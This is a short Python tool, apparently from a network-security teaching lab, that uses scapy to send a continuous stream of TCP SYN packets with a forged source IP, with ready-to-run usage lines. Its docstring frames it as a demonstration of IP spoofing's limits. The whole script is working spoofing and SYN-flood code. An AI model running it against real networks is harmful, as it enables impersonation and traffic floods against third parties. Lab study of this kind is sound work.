"""
ip_spoofer.py — run on Darth (attacker)

Sends TCP SYN packets with a forged source IP.
Replies go to the spoofed IP (not to Darth) — demonstrating the fundamental
limitation of IP spoofing without a Layer 2 MITM.

Usage:
    sudo python3 ip_spoofer.py 10.0.0.10 10.0.0.20
    sudo python3 ip_spoofer.py 10.0.0.10 10.0.0.20 --dst-port 53 --interval 1.0
"""
from scapy.all import IP, TCP, send, RandShort
import typer
import time
from rich.console import Console

console = Console()


def main(
    spoofed_ip: str = typer.Argument(..., help="Source IP to forge (e.g. Alice's IP)"),
    dst_ip:     str = typer.Argument(..., help="Destination IP (e.g. Bob's IP)"),
    dst_port:   int = typer.Option(80, help="Destination TCP port"),
    interval:   float = typer.Option(0.5, help="Seconds between packets"),
):
    console.print(f"[red]IP Spoofing started[/red]")
    console.print(f"  Forged src: [yellow]{spoofed_ip}[/yellow]")
    console.print(f"  Destination: [cyan]{dst_ip}:{dst_port}[/cyan]")
    console.print("[dim]Replies go to the spoofed IP, not here. Press Ctrl+C to stop.[/dim]")

    count = 0
    try:
        with console.status(f"Sent: {count}") as status:
            while True:
                pkt = (
                    IP(src=spoofed_ip, dst=dst_ip)
                    / TCP(sport=RandShort(), dport=dst_port, flags="S")
                )
                send(pkt, verbose=0)
                count += 1
                if count % 10 == 0:
                    status.update(f"Sent: {count}")
                time.sleep(interval)
    except KeyboardInterrupt:
        console.print(f"\n[yellow]Stopped.[/yellow] Total packets sent: {count}")


if __name__ == "__main__":
    typer.run(main)
